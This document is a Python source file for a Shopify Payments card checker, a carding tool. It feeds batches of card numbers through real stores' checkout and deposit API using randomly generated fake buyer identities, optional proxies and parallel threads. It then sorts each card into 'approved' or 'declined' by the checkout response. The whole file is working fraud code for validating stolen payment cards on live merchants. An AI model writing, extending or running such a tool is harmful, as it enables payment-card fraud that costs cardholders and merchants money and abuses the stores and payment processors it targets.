# Charge10_ShopifyPayments.py - Fast Shopify Payments Checker (CHARGED MODE)
# Uses direct HTTP requests - NO browser automation needed
# Works with Shopify stores using Shopify Payments (not Stripe)

import requests
import re
import json
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

# --- Data Generation ---
FIRST_NAMES = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole", "Nicholas", "Anthony", "Heather", "Eric", "Elizabeth"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Martin", "Jackson"]
DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

def random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = f"{first.lower()}.{last.lower()}{random.randint(100,9999)}@{random.choice(DOMAINS)}"
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return {
        'first_name': first,
        'last_name': last,
        'email': email,
        'phone': phone,
        'address1': f"{random.randint(100,9999)} Main Street",
        'city': 'New York',
        'province': 'New York',
        'province_code': 'NY',
        'country': 'United States',
        'country_code': 'US',
        'zip': f"{random.randint(10001,10999)}"
    }

class ShopifyPaymentsChecker:
    """Fast Shopify Payments checker using direct HTTP requests"""
    
    def __init__(self, store_url, timeout=30, proxy=None):
        self.store_url = store_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
        })
        
        # Set proxy if provided
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
    def get_checkout_token(self):
        """Get a checkout token by adding a product to cart"""
        try:
            # Get products
            products_url = f"{self.store_url}/products.json?limit=1"
            resp = self.session.get(products_url, timeout=self.timeout)
            
            if resp.status_code == 404:
                return None, "Store not found (404)"
            if resp.status_code == 403:
                return None, "Store access forbidden (403)"
            if resp.status_code != 200:
                return None, f"Store not accessible (HTTP {resp.status_code})"
            
            try:
                products = resp.json().get('products', [])
            except:
                return None, "Invalid store response (not JSON)"
            
            if not products:
                return None, "No products in store"
            
            # Get first available variant
            variant_id = None
            for product in products:
                for variant in product.get('variants', []):
                    if variant.get('available', True):
                        variant_id = variant['id']
                        break
                if variant_id:
                    break
            
            if not variant_id:
                return None, "No available variants"
            
            # Add to cart
            cart_url = f"{self.store_url}/cart/add.js"
            cart_data = {'id': variant_id, 'quantity': 1}
            resp = self.session.post(cart_url, json=cart_data, timeout=self.timeout)
            
            if resp.status_code != 200:
                return None, "Failed to add to cart"
            
            # Create checkout
            checkout_url = f"{self.store_url}/checkout"
            resp = self.session.get(checkout_url, timeout=self.timeout, allow_redirects=True)
            
            # Extract checkout token from URL
            final_url = resp.url
            match = re.search(r'/checkouts/([a-z0-9]+)', final_url)
            if match:
                return match.group(1), None
            
            # Try to find in page
            match = re.search(r'"token":"([a-z0-9]+)"', resp.text)
            if match:
                return match.group(1), None
            
            return None, "Could not get checkout token"
            
        except requests.exceptions.Timeout:
            return None, "Store timeout"
        except requests.exceptions.ConnectionError:
            return None, "Store connection failed"
        except requests.exceptions.RequestException as e:
            return None, f"Network error: {str(e)[:30]}"
        except Exception as e:
            return None, f"Error: {str(e)[:30]}"
    
    def submit_contact_info(self, checkout_token, identity):
        """Submit contact information to checkout"""
        try:
            url = f"{self.store_url}/checkouts/{checkout_token}"
            
            data = {
                '_method': 'patch',
                'checkout[email]': identity['email'],
                'checkout[shipping_address][first_name]': identity['first_name'],
                'checkout[shipping_address][last_name]': identity['last_name'],
                'checkout[shipping_address][address1]': identity['address1'],
                'checkout[shipping_address][address2]': '',
                'checkout[shipping_address][city]': identity['city'],
                'checkout[shipping_address][country]': identity['country_code'],
                'checkout[shipping_address][province]': identity['province_code'],
                'checkout[shipping_address][zip]': identity['zip'],
                'checkout[shipping_address][phone]': identity['phone'],
            }
            
            resp = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
            return resp.status_code == 200, resp
            
        except Exception as e:
            return False, str(e)
    
    def get_payment_session(self, checkout_token):
        """Get payment session ID for Shopify Payments"""
        try:
            # Get checkout page to find payment gateway info
            url = f"{self.store_url}/checkouts/{checkout_token}"
            resp = self.session.get(url, timeout=self.timeout)
            
            # Look for Shopify Payments session
            # Pattern: "payment_session_id":"xxx" or data-payment-session-id="xxx"
            patterns = [
                r'"payment_session_id":"([^"]+)"',
                r'data-payment-session-id="([^"]+)"',
                r'"session_id":"([^"]+)"',
                r'Shopify\.Checkout\.payment_session_id\s*=\s*["\']([^"\']+)["\']',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, resp.text)
                if match:
                    return match.group(1), resp.text
            
            return None, resp.text
            
        except Exception as e:
            return None, str(e)
    
    def submit_card_direct(self, checkout_token, card_number, exp_month, exp_year, cvv, identity):
        """Submit card directly to Shopify Payments"""
        try:
            # First, get the checkout page to extract necessary tokens
            checkout_url = f"{self.store_url}/checkouts/{checkout_token}"
            resp = self.session.get(checkout_url, timeout=self.timeout)
            
            # Extract authenticity token
            auth_token_match = re.search(r'name="authenticity_token"\s+value="([^"]+)"', resp.text)
            auth_token = auth_token_match.group(1) if auth_token_match else ''
            
            # Extract payment gateway ID
            gateway_match = re.search(r'"payment_gateway_id":(\d+)', resp.text)
            if not gateway_match:
                gateway_match = re.search(r'data-gateway-id="(\d+)"', resp.text)
            gateway_id = gateway_match.group(1) if gateway_match else ''
            
            # Build payment data
            payment_url = f"{self.store_url}/checkouts/{checkout_token}"
            
            # Format expiry
            exp_year_full = f"20{exp_year}" if len(exp_year) == 2 else exp_year
            
            payment_data = {
                '_method': 'patch',
                'authenticity_token': auth_token,
                'previous_step': 'payment_method',
                'step': '',
                'checkout[payment_gateway]': gateway_id,
                'checkout[credit_card][number]': card_number,
                'checkout[credit_card][name]': f"{identity['first_name']} {identity['last_name']}",
                'checkout[credit_card][month]': exp_month,
                'checkout[credit_card][year]': exp_year_full,
                'checkout[credit_card][verification_value]': cvv,
                'checkout[different_billing_address]': 'false',
                'checkout[remember_me]': '0',
                'checkout[vault_phone]': '',
                'complete': '1',
            }
            
            # Submit payment
            resp = self.session.post(
                payment_url, 
                data=payment_data, 
                timeout=self.timeout,
                allow_redirects=True
            )
            
            return self.parse_response(resp)
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def submit_via_deposit_api(self, checkout_token, card_number, exp_month, exp_year, cvv):
        """Submit card via Shopify's deposit API (alternative method)"""
        try:
            # Get shop ID from checkout
            checkout_url = f"{self.store_url}/checkouts/{checkout_token}"
            resp = self.session.get(checkout_url, timeout=self.timeout)
            
            # Extract shop ID
            shop_id_match = re.search(r'"shopId":(\d+)', resp.text)
            if not shop_id_match:
                shop_id_match = re.search(r'Shopify\.shop_id\s*=\s*(\d+)', resp.text)
            
            if not shop_id_match:
                return "Error: Could not find shop ID"
            
            shop_id = shop_id_match.group(1)
            
            # Format card data for deposit API
            exp_year_full = f"20{exp_year}" if len(exp_year) == 2 else exp_year
            
            # Shopify deposit API endpoint
            deposit_url = f"https://deposit.shopifycs.com/sessions"
            
            card_data = {
                "credit_card": {
                    "number": card_number,
                    "month": int(exp_month),
                    "year": int(exp_year_full),
                    "verification_value": cvv,
                    "name": "Test User"
                }
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }
            
            resp = self.session.post(deposit_url, json=card_data, headers=headers, timeout=self.timeout)
            
            if resp.status_code == 200:
                result = resp.json()
                session_id = result.get('id')
                if session_id:
                    # Now complete checkout with session ID
                    return self.complete_checkout_with_session(checkout_token, session_id)
            
            return f"Deposit API Error: {resp.status_code}"
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def complete_checkout_with_session(self, checkout_token, session_id):
        """Complete checkout using payment session ID"""
        try:
            checkout_url = f"{self.store_url}/checkouts/{checkout_token}"
            resp = self.session.get(checkout_url, timeout=self.timeout)
            
            # Extract authenticity token
            auth_token_match = re.search(r'name="authenticity_token"\s+value="([^"]+)"', resp.text)
            auth_token = auth_token_match.group(1) if auth_token_match else ''
            
            # Extract payment gateway ID
            gateway_match = re.search(r'"payment_gateway_id":(\d+)', resp.text)
            gateway_id = gateway_match.group(1) if gateway_match else ''
            
            payment_data = {
                '_method': 'patch',
                'authenticity_token': auth_token,
                'previous_step': 'payment_method',
                'step': '',
                'checkout[payment_gateway]': gateway_id,
                's': session_id,
                'checkout[different_billing_address]': 'false',
                'checkout[remember_me]': '0',
                'complete': '1',
            }
            
            resp = self.session.post(
                checkout_url,
                data=payment_data,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            return self.parse_response(resp)
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def parse_response(self, resp):
        """Parse checkout response to determine result"""
        text = resp.text.lower()
        url = resp.url.lower()
        
        # Check URL for success indicators
        if '/thank_you' in url or '/thank-you' in url or 'order-confirmation' in url:
            return "CHARGED"
        
        if '/processing' in url:
            return "PROCESSING"
        
        # Check for specific error messages
        error_patterns = {
            'card was declined': 'DECLINED',
            'card has been declined': 'DECLINED',
            'payment was declined': 'DECLINED',
            'transaction declined': 'DECLINED',
            'do not honor': 'DECLINED',
            'insufficient funds': 'INSUFFICIENT_FUNDS',
            'not enough funds': 'INSUFFICIENT_FUNDS',
            'incorrect cvc': 'CVV_MISMATCH',
            'invalid cvc': 'CVV_MISMATCH',
            'security code is incorrect': 'CVV_MISMATCH',
            'security code is invalid': 'CVV_MISMATCH',
            'card number is incorrect': 'INVALID_CARD',
            'invalid card number': 'INVALID_CARD',
            'card has expired': 'EXPIRED_CARD',
            'expired card': 'EXPIRED_CARD',
            'lost card': 'LOST_CARD',
            'stolen card': 'STOLEN_CARD',
            'fraud': 'FRAUD',
            'pick up card': 'PICKUP_CARD',
            '3d secure': '3DS_REQUIRED',
            'authentication required': '3DS_REQUIRED',
            'verify your card': '3DS_REQUIRED',
        }
        
        for pattern, result in error_patterns.items():
            if pattern in text:
                return result
        
        # Check for success indicators in page content
        success_patterns = [
            'order confirmed',
            'thank you for your order',
            'order has been placed',
            'payment successful',
            'order number',
            'confirmation number',
        ]
        
        for pattern in success_patterns:
            if pattern in text:
                return "CHARGED"
        
        # Default to declined if we can't determine
        return "DECLINED"
    
    def check_card(self, card_str):
        """Main method to check a card - CHARGED MODE"""
        try:
            # Parse card
            parts = card_str.strip().split('|')
            if len(parts) != 4:
                return "Error: Invalid card format (use NUM|MM|YY|CVV)"
            
            card_number = parts[0].replace(' ', '')
            exp_month = parts[1].zfill(2)
            exp_year = parts[2][-2:] if len(parts[2]) == 4 else parts[2]
            cvv = parts[3]
            
            # Generate identity
            identity = generate_identity()
            
            # Step 1: Get checkout token
            checkout_token, error = self.get_checkout_token()
            if not checkout_token:
                return f"Error: {error}"
            
            # Step 2: Submit contact info
            success, _ = self.submit_contact_info(checkout_token, identity)
            if not success:
                return "Error: Failed to submit contact info"
            
            # Step 3: Try deposit API first (faster)
            result = self.submit_via_deposit_api(checkout_token, card_number, exp_month, exp_year, cvv)
            
            if 'Error' in result:
                # Fallback to direct submission
                result = self.submit_card_direct(checkout_token, card_number, exp_month, exp_year, cvv, identity)
            
            return result
            
        except Exception as e:
            return f"Error: {str(e)}"


def ShopifyPaymentsCheck(card_str, store_url, proxy=None):
    """
    Check a card using Shopify Payments (CHARGED MODE)
    
    Args:
        card_str: Card in format "NUMBER|MM|YY|CVV"
        store_url: Shopify store URL (e.g., "https://store.myshopify.com")
        proxy: Optional proxy (e.g., "http://user:pass@host:port")
    
    Returns:
        str: Result status (CHARGED, DECLINED, CVV_MISMATCH, etc.)
    """
    checker = ShopifyPaymentsChecker(store_url, proxy=proxy)
    return checker.check_card(card_str)


def check_multiple_cards(cards, store_url, threads=5):
    """
    Check multiple cards in parallel
    
    Args:
        cards: List of card strings
        store_url: Shopify store URL
        threads: Number of parallel threads
    
    Returns:
        dict: Results with 'approved', 'declined', 'errors' lists
    """
    results = {'approved': [], 'declined': [], 'errors': []}
    
    def check_single(card):
        result = ShopifyPaymentsCheck(card, store_url)
        return card, result
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_single, card): card for card in cards}
        
        for future in as_completed(futures):
            card, result = future.result()
            
            if result in ['CHARGED', 'CVV_MISMATCH', 'INSUFFICIENT_FUNDS', '3DS_REQUIRED']:
                results['approved'].append((card, result))
            elif 'Error' in result:
                results['errors'].append((card, result))
            else:
                results['declined'].append((card, result))
    
    return results


# --- Standalone Test ---
if __name__ == "__main__":
    # Test with a sample store and card
    test_store = "https://example-store.myshopify.com"  # Replace with real store
    test_card = "4242424242424242|12|25|123"
    
    print(f"Testing Shopify Payments Checker")
    print(f"Store: {test_store}")
    print(f"Card: {test_card[:6]}****{test_card[-4:]}")
    print()
    
    result = ShopifyPaymentsCheck(test_card, test_store)
    print(f"Result: {result}")
